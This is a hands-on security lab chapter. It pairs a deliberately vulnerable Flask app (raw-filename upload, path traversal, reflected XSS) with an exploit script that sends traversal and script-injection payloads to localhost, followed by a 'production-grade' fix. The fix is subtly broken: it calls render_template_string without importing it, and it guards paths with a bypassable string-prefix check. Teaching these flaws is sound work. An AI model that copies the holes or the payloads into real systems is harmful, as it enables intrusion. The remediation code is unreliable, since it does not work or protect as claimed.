---
title: "Chapter 6: Hands-On Lab"
description: "Self-contained hands-on vulnerability lab: Spin up a vulnerable Python Flask application, execute an automated exploit script, and implement production security remediations."
keywords: ["AppSec", "Hands-On Lab", "Exploit", "Path Traversal", "File Upload", "XSS", "Flask", "Remediation"]
---

# Chapter 6: Hands-On Lab

## Lab Overview: File Upload, Path Traversal & Reflected XSS

In this self-contained lab, you will spin up a lightweight Python Flask web service containing three critical vulnerabilities:
1. **Unsanitized File Upload** (Arbitrary web shell upload)
2. **Path Traversal** (Reading arbitrary system files via relative pathing)
3. **Reflected Cross-Site Scripting (XSS)** (Injecting dynamic HTML payloads)

You will run an automated **exploit script** (`exploit.py`) to confirm vulnerability exploitability, then deploy the hardened production application (`app_secure.py`) to verify complete mitigation.

---

## Lab Architecture & Workflow

```mermaid
sequenceDiagram
    autonumber
    actor Tester as Security Tester (exploit.py)
    participant VulnApp as Vulnerable Server (app_vuln.py)
    participant SecureApp as Hardened Server (app_secure.py)

    Note over Tester,VulnApp: STEP 1: Exploit Vulnerable Application
    Tester->>VulnApp: POST /upload (shell.py disguised as upload)
    VulnApp-->>Tester: 200 OK (Uploaded to disk under raw user filename!)
    Tester->>VulnApp: GET /download?file=../app_vuln.py
    VulnApp-->>Tester: 200 OK (Returns source code file contents!)
    Tester->>VulnApp: GET /search?q=<script>alert('PWNED')</script>
    VulnApp-->>Tester: 200 OK (Renders raw un-encoded XSS payload)

    Note over Tester,SecureApp: STEP 2: Verify Hardened Defense
    Tester->>SecureApp: POST /upload (shell.py payload)
    SecureApp-->>Tester: 415 Unsupported Media Type (Magic byte check fails!)
    Tester->>SecureApp: GET /download?file=../app_vuln.py
    SecureApp-->>Tester: 403 Forbidden (Path Traversal blocked!)
    Tester->>SecureApp: GET /search?q=<script>alert('PWNED')</script>
    SecureApp-->>Tester: 200 OK (Renders escaped safe text: &lt;script&gt;)
```

---

## Prerequisites & Installation

Ensure Python 3.8+ is installed on your system. Install the required lab dependencies:

```bash
pip install Flask requests puremagic nh3 werkzeug
```

---

## Step 1: The Vulnerable Application (`app_vuln.py`)

Create `app_vuln.py` in your lab directory:

```python
# app_vuln.py
from flask import Flask, request, send_file, render_template_string
import os

app = Flask(__name__)
UPLOAD_DIR = os.path.abspath("uploads")
os.makedirs(UPLOAD_DIR, exist_ok=True)

# VULNERABILITY 1: Unsanitized File Upload (Trusts filename & extension completely)
@app.route('/upload', methods=['POST'])
def upload():
    file = request.files.get('file')
    if not file:
        return "No file provided", 400
    
    # Insecure: Using client-supplied filename without magic byte validation or UUIDs
    target_path = os.path.join(UPLOAD_DIR, file.filename)
    file.save(target_path)
    return f"File uploaded successfully to {target_path}", 200

# VULNERABILITY 2: Path Traversal (No canonical containment check)
@app.route('/download', methods=['GET'])
def download():
    filename = request.args.get('file', '')
    # Insecure: Joining path without checking if target escapes UPLOAD_DIR
    target_path = os.path.join(UPLOAD_DIR, filename)
    return send_file(target_path)

# VULNERABILITY 3: Reflected XSS (Raw HTML String Formatting)
@app.route('/search', methods=['GET'])
def search():
    query = request.args.get('q', '')
    # Insecure: Formatting raw string into template bypasses auto-escaping
    template = f"<h1>Search Results for: {query}</h1>"
    return render_template_string(template)

if __name__ == '__main__':
    print("[*] Starting Vulnerable App on http://127.0.0.1:5000")
    app.run(port=5000, debug=True)
```

---

## Step 2: The Exploit Script (`exploit.py`)

Create `exploit.py` to automate the attack verification against the running server:

```python
# exploit.py
import requests

BASE_URL = "http://127.0.0.1:5000"

def test_file_upload_exploit():
    print("\n--- [1] Testing Arbitrary File Upload Exploit ---")
    files = {'file': ('web_shell.py', 'import os; print("EXECUTE ARBITRARY CODE")')}
    res = requests.post(f"{BASE_URL}/upload", files=files)
    print(f"[+] Status Code: {res.status_code}")
    print(f"[+] Server Response: {res.text.strip()}")

def test_path_traversal_exploit():
    print("\n--- [2] Testing Path Traversal Exploit ---")
    # Payload attempts to escape uploads directory and read app_vuln.py
    payload = "../app_vuln.py"
    res = requests.get(f"{BASE_URL}/download", params={'file': payload})
    print(f"[+] Status Code: {res.status_code}")
    if "VULNERABILITY" in res.text:
        print("[!] EXPLOIT SUCCESSFUL! Leaked Source Code Content Preview:")
        print(res.text[:300])
    else:
        print("[-] Exploit failed or file not accessible.")

def test_reflected_xss_exploit():
    print("\n--- [3] Testing Reflected XSS Exploit ---")
    xss_payload = "<script>alert('PWNED-XSS')</script>"
    res = requests.get(f"{BASE_URL}/search", params={'q': xss_payload})
    print(f"[+] Status Code: {res.status_code}")
    if xss_payload in res.text:
        print("[!] EXPLOIT SUCCESSFUL! Raw XSS payload reflected in HTTP response body:")
        print(res.text.strip())
    else:
        print("[-] XSS payload was encoded or blocked.")

if __name__ == '__main__':
    try:
        test_file_upload_exploit()
        test_path_traversal_exploit()
        test_reflected_xss_exploit()
    except requests.exceptions.ConnectionError:
        print("[ERROR] Ensure app_vuln.py or app_secure.py is running on port 5000!")
```

---

## Step 3: Hardened Remediation Application (`app_secure.py`)

Create `app_secure.py` incorporating production-grade mitigations:

```python
# app_secure.py
from flask import Flask, request, send_file, abort, render_template
from pathlib import Path
import uuid
import puremagic
import nh3

app = Flask(__name__)
UPLOAD_DIR = Path("safe_uploads").resolve()
UPLOAD_DIR.mkdir(exist_ok=True)

# Explicit MIME Allowlist mapping to safe extensions
ALLOWED_MIME_TYPES = {
    "image/png": ".png",
    "image/jpeg": ".jpg",
    "text/plain": ".txt"
}

# REMEDIATION 1: Magic Byte Inspection + UUID Filename Isolation
@app.route('/upload', methods=['POST'])
def upload():
    file = request.files.get('file')
    if not file:
        return abort(400, "No file provided")

    # Read binary header (first 2048 bytes) for signature validation
    header_bytes = file.read(2048)
    file.seek(0)

    try:
        matches = puremagic.from_string(header_bytes)
        if not matches:
            return abort(415, "Unsupported file signature")
        detected_mime = matches[0].mime_type
    except Exception:
        return abort(415, "Failed to analyze binary magic bytes")

    if detected_mime not in ALLOWED_MIME_TYPES:
        return abort(415, f"Disallowed media type: {detected_mime}")

    # Generate random UUID filename
    safe_ext = ALLOWED_MIME_TYPES[detected_mime]
    random_filename = f"{uuid.uuid4()}{safe_ext}"
    target_path = (UPLOAD_DIR / random_filename).resolve()

    # Verify target stays strictly within UPLOAD_DIR boundary
    if not str(target_path).startswith(str(UPLOAD_DIR)):
        return abort(403, "Illegal path destination")

    file.save(target_path)
    return f"File securely stored as {random_filename}", 200

# REMEDIATION 2: Canonical Containment Traversal Check
@app.route('/download', methods=['GET'])
def download():
    filename = request.args.get('file', '')
    if not filename:
        return abort(400, "Filename parameter required")

    # Resolve absolute path
    target_path = (UPLOAD_DIR / filename).resolve()

    # Boundary check: Ensure path does not escape UPLOAD_DIR
    if not str(target_path).startswith(str(UPLOAD_DIR)):
        return abort(403, "Access Denied: Path traversal detected")

    if not target_path.exists() or not target_path.is_file():
        return abort(404, "Requested asset not found")

    return send_file(target_path)

# REMEDIATION 3: Context-Aware Escaping + Security Headers
@app.route('/search', methods=['GET'])
def search():
    query = request.args.get('q', '')
    # Pass variable into template dictionary so Jinja2 auto-escapes HTML characters
    template = "<h1>Search Results for: {{ query }}</h1>"
    
    response = app.make_response(render_template_string(template, query=query))
    response.headers['Content-Security-Policy'] = "default-src 'self';"
    response.headers['X-Content-Type-Options'] = 'nosniff'
    return response

if __name__ == '__main__':
    print("[*] Starting Hardened Secure App on http://127.0.0.1:5000")
    app.run(port=5000)
```

---

## Step-by-Step Lab Execution Guide

### 1. Test Vulnerable Application
1. Terminal 1: Run `python app_vuln.py`
2. Terminal 2: Run `python exploit.py`
3. **Observe Results:**
   - The exploit successfully uploads `web_shell.py` using user input.
   - The path traversal exploit leaks `app_vuln.py` source code.
   - The reflected XSS payload is returned raw in the response.

### 2. Test Hardened Secure Application
1. Terminal 1: Stop `app_vuln.py` (`Ctrl+C`) and start `python app_secure.py`
2. Terminal 2: Run `python exploit.py`
3. **Observe Defensive Results:**
   - **Upload:** Rejected with `415 Unsupported Media Type` (magic bytes blocked `.py` script).
   - **Download:** Blocked with `403 Forbidden` (path traversal detected).
   - **Search:** Returns `200 OK` with HTML-escaped output (`&lt;script&gt;alert(...)&lt;/script&gt;`).

---

> [!TIP]
> **Lab Verification Challenge:** Try tweaking `exploit.py` to send a valid PNG file signature (`\x89PNG\r\n\x1a\n...`) but with a `.py` extension. Observe how `app_secure.py` handles the extension override using its strict `ALLOWED_MIME_TYPES` UUID assignment!
